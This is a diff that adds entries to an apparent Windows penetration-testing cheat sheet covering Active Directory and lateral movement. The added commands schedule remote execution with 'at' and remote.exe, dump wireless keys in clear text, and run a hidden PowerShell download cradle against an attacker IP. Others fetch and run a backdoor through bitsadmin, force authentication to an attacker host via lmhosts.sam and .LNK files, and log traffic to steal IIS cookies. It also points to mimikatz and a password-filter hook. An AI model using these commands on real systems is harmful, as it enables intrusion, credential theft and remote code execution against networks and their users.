@@ -75,6 +75,58 @@ DsQuery Server -Forest -s <DC IP> -u <username> -p <password>
 # Dump all users  associated attributes
 csvde -m -b <username domain password> -f c:users.csv
 
+# AT - Requires Admin; Executes as system
+net use \\<target> /user:<domain>\<user> <pass>
+net time \\<target>
+at \\<target> <time> <path\BAT file>
+# e.g.
+at \\<target> 13:37 c:\debuggers\remote.exe /c cmd.exe SYSCMD
+# Connect to debug listener
+c:\debuggers\remote.exe /c <target> SYSCMD
+
+# Rename on next reboot (requires admin)
+HKLM\System\CurrentControlSet\Control\Session Manager\PendingFileRenameOperations
+# Content example
+\??\D:\temp\ntfs.sys
+|\??\D:\winnt\system32\drivers\ntfs.sys
+
+# Export wireless configs (dumps all including certs)
+netsh wlan export profile key=clear
+
+# Powershell run remote file in memory
+powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://<attacker IP>:<port>/<file>'))"
+
+# BITSADMIN downloader/exec
+bitsadmin /create <mybackdoor>
+bitsadmin /addfile <mybackdoor> http://<IP>/<shellfile> C:\Windows\temp\<myshell.exe>
+bitsadmin /SETNOTIFYCMDLINE <mybackdoor> C:\Windows\temp\<myshell.exe> NULL
+
+# Powershell Password Filter hook
+# https://github.com/clymb3r/Misc-Windows-Hacking
+
+# Compile mimikatz from src https://github.com/gentilkiwi/mimikatz
+
+# Forces auth using lmhosts.sam (requires admin)
+C:\windows\System32\drivers\etc\lmhosts.sam
+# Content example
+<attacker IP> <evil filename> #PRE
+192.168.1.2 evil #PRE
+
+# Forced auth using .LNK file
+Set icon image to UNC path to attacker IP
+
+# IIS running WinRM can be found at /wsman can allow SMB
+
+# Windows port fordwarding (requires admin)
+netsh interface portproxy delete v4tov6 listenport= {Integer | ServiceName} [[listenaddress=] {IPv4Address| HostName}] [[protocol=]tcp]
+
+# AD User AD Zone Xfer
+# https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1
+powershell.exe -ep bypass -f dns-dump.ps1 -zone <dns zone> -dc <DC IP>
+
+# IIS steal cookies (requires admin)
+logman start LogCookies -p Microsoft-Windows-WinInet -o logcookies.etl -ets
+
 # Powershell dump AD users' properties
 import-module ActiveDirectory
 get-aduser -Properties * -Credential domain\username -Server 10.1.1.10 > properties.txt
